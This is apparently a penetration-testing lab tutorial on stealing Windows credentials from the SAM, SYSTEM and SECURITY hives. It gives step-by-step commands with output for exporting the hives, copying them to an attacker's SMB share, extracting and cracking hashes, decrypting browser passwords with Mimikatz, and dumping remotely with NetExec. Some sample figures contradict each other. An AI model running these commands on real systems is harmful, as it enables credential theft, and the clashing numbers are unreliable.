# Attacking SAM, SYSTEM, and SECURITY

Attacking the SAM, SYSTEM, and SECURITY registry hives is one of the most reliable post-exploitation techniques for recovering credentials from a compromised Windows system. With local administrative access, all three hives can be exported offline, transferred to an attack host, and processed without maintaining an active session — reducing detection risk and time pressure.

## Registry Hives and What They Hold

Three specific hives are targeted:

| Hive | Path | Contains |
|---|---|---|
| `HKLM\SAM` | `%SystemRoot%\system32\config\SAM` | NTLM (and LM) hashes for all local user accounts |
| `HKLM\SYSTEM` | `%SystemRoot%\system32\config\SYSTEM` | The system boot key used to encrypt the SAM database — required for decryption |
| `HKLM\SECURITY` | `%SystemRoot%\system32\config\SECURITY` | LSA secrets, DCC2 cached domain credentials, DPAPI machine/user keys, NL$KM |

SAM and SYSTEM are sufficient to recover local NTLM hashes. SECURITY is valuable when the target is domain-joined, as it holds DCC2 hashes for recently authenticated domain users and DPAPI key material.

## Step 1: Exporting the Hives

The `reg.exe` utility with the `save` subcommand creates an offline copy of any registry hive. This requires a `cmd.exe` session running with administrative privileges:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

These commands are well-known and are logged under Windows Event ID 4657 (registry value modified) and are flagged by most EDR products. Detection signatures for `reg save` against SAM, SYSTEM, and SECURITY are documented under [MITRE ATT&CK T1003.002](https://attack.mitre.org/techniques/T1003/002/).

## Step 2: Transferring to the Attack Host

Impacket's `smbserver.py` creates a temporary SMB share on the attacker machine to receive the files. The `-smb2support` flag is mandatory on modern targets as SMBv1 is disabled by default:

```bash
# On the attack host
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/loot/
```

```cmd
# On the Windows target
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

## Step 3: Dumping Hashes Offline with secretsdump

[Impacket's secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) processes the three hive files offline using the `LOCAL` keyword. Its first action is always to derive the system boot key from the SYSTEM hive — without it, the SAM hashes cannot be decrypted:

```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```
[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74...
```

The output format for SAM hashes is `username:RID:lmhash:nthash`. The LM hash `aad3b435b51404eeaad3b435b51404ee` is the standard empty/disabled LM hash value seen on all modern Windows systems where LM storage is disabled. The field to extract for cracking is the **NT hash** (the fourth field).

## Step 4: Cracking NT Hashes

Extract the NT hashes into a file and crack them with Hashcat mode `1000`:

```bash
# Extract NT hashes
cat hashestocrack.txt
64f12cddaa88057e06a81b54e73b949b
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d

hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

```
f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian
31d6cfe0d16ae931b73c59d7e0c089c0:          ← empty password (disabled/guest account)

Status: Cracked
Speed.#1.........: 14284 H/s
```

NTLM is a fast, unsalted hash — on a modern GPU this cracking speed reaches hundreds of millions per second. Even with a weak wordlist, most common passwords crack in seconds. The empty hash `31d6cfe0d16ae931b73c59d7e0c089c0` represents a blank password and is the standard NTLM hash of an empty string.

## DCC2 (Cached Domain Credentials)

When HKLM\SECURITY is dumped on a domain-joined machine, cached logon hashes appear in DCC2 format:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

DCC2 uses PBKDF2 with 10,240 iterations (by default) to derive the hash, making it dramatically slower to crack than NTLM. Hashcat mode `2100` handles DCC2:

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
Speed.#1.........: 5536 H/s
```

NT hashes crack at ~4,600,000 H/s on the same hardware, so DCC2 is approximately **800x slower** to crack. This means a 14-million-entry wordlist that takes under a second against NT hashes will take around 45 minutes against DCC2 — and the gap widens dramatically with rules or masks. Additionally, DCC2 hashes **cannot be used for Pass-the-Hash**, unlike NT hashes, limiting their direct offensive utility.

## DPAPI Key Material

The DPAPI machine and user keys extracted from HKLM\SECURITY are the master keys used to protect DPAPI-encrypted blobs stored across the system. Applications that use DPAPI include:

| Application | Protected Data |
|---|---|
| Google Chrome / Edge | Saved passwords and cookies (`Login Data`, `Cookies` files) |
| Internet Explorer | Form auto-complete credentials |
| Outlook | Stored email account passwords |
| Credential Manager | Network shares, VPN, Wi-Fi credentials |
| Remote Desktop Connection | Saved RDP host credentials |

Mimikatz can decrypt Chrome credentials directly when running in the user's session context:

```cmd
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

URL     : http://10.10.14.94/
Username: bob
Password: April2025!
```

Note that Mimikatz must run under the **target user's session context**, not SYSTEM, to call `CryptUnprotectData()` successfully. Running as SYSTEM (e.g., via PsExec) will fail with a key handle error because DPAPI master keys are user-specific. Alternatives that can operate cross-session or offline include Impacket's [dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), and [DonPAPI](https://github.com/login-securite/DonPAPI).

## Remote Dumping with NetExec

If a valid set of local admin credentials is already available, the entire process can be performed remotely without touching the filesystem manually. NetExec automates the hive save, transfer, and secretsdump execution in a single command:

```bash
# Dump SAM hashes remotely
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB  10.129.42.198  445  WS01  [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB  10.129.42.198  445  WS01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  10.129.42.198  445  WS01  bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

# Dump LSA secrets remotely
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB  10.129.42.198  445  WS01  WS01\worker:Hello123
SMB  10.129.42.198  445  WS01  dpapi_machinekey:0xc03a4a9b...
```

NetExec saves the dumped hashes automatically to `~/.nxc/logs/` for later reference. The `--local-auth` flag is critical here — it tells NetExec to authenticate against the local SAM rather than attempting domain authentication, which is correct when targeting workgroup machines or using local admin credentials on domain-joined hosts.

## Technique Reference

| Goal | Tool | Method |
|---|---|---|
| Export hives locally | `reg.exe save` | Requires admin cmd session |
| Transfer hives to attacker | `smbserver.py` + `move` | SMB share on attack host |
| Offline hash extraction | `secretsdump.py LOCAL` | Requires SAM + SYSTEM hives |
| Crack NT hashes | `hashcat -m 1000` | Fast; ~14k H/s CPU, >>100M H/s GPU |
| Crack DCC2 hashes | `hashcat -m 2100` | ~800x slower than NTLM; no PTH use |
| Decrypt DPAPI blobs | Mimikatz `dpapi::*` | Must run as target user, not SYSTEM |
| Remote SAM dump | `netexec --sam` | Local admin creds required |
| Remote LSA dump | `netexec --lsa` | Local admin creds required |
